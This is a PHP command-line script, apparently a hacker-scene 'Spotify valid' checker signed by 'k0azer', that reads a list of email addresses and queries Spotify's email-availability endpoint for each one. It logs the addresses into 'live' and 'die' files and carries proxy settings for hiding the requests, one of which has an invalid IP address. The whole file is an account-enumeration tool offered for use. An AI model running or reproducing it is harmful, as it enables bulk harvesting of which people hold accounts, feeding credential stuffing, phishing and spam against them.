<?php 
error_reporting(0);
echo "\033[1;31m[+]-==================================================-[+]\n";
echo"\t\t\033[1;33m 
  _     ___
 | |   / _ \
 | | _| | | | __ _ _______ _ __
 | |/ / | | |/ _` |_  / _ \ '__|
 |   <| |_| | (_| |/ /  __/ |
 |_|\_\\\___/ \__,_/___\___|_|
 
// Ssttt !!! be Quiet!
// Valid Spotify V.1
// CODED BY k0azer
// nhansanc3z@gmail.com\n";
echo "\033[1;31m[+]-==================================================-[+]\n\033[1;37m"; 
if(is_file($argv[1]) or die("\033[1;32m[+] USAGE: php spotify.php yourmaillist.txt [+]\033[1;37m")) { 
$mailist = $argv[1]; 
$get_mail = file_get_contents("$mailist") ; 
$mail = (explode("\n", $get_mail)); 
echo "\nGetting Your Maillist , Just Wait......\n\n";
foreach($mail as $no => $email){
$ch = curl_init();
curl_setopt ($ch, CURLOPT_URL, "https://www.spotify.com/id/xhr/json/isEmailAvailable.php?email=$email");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
$proxy = '204.116.211.750';
$port = '8080';
//curl_setopt($ch, CURLOPT_PROXY, "167.71.182.13");
//curl_setopt($ch, CURLOPT_PROXYPORT, "3128");
//curl_setopt($ch, CURLOPT_VERBOSE, 1);
$result = curl_exec($ch);
$sukses_login="true";
date_default_timezone_set('Asia/Jakarta'); 
$waktu = date("H:i:s");
if(preg_match("/$sukses_login/",$result)){
	$buat_file = fopen("spotify-live.txt", "a") or die("Unable to open file!");
	$tulis =("$email \r\n");
	fwrite($buat_file, $tulis);
	fclose($buat_file); 
	echo "\033[1;37m[$no] \033[1;32m$result => $email \033[1;37m[$waktu] \033[1;36mChecked by k0azer\n"; 
}
else{ 
	$buat_file = fopen("spotify-die.txt", "a") or die("Unable to open file!");
	$tulis =("$email \r\n");
	fwrite($buat_file, $tulis);
	fclose($buat_file); 
	echo "\033[1;37m[$no] \033[1;31m$result => $email \033[1;37m[$waktu] \033[1;36mChecked by k0az3r\n"; 
}
curl_close($ch);
 }  
}
?>
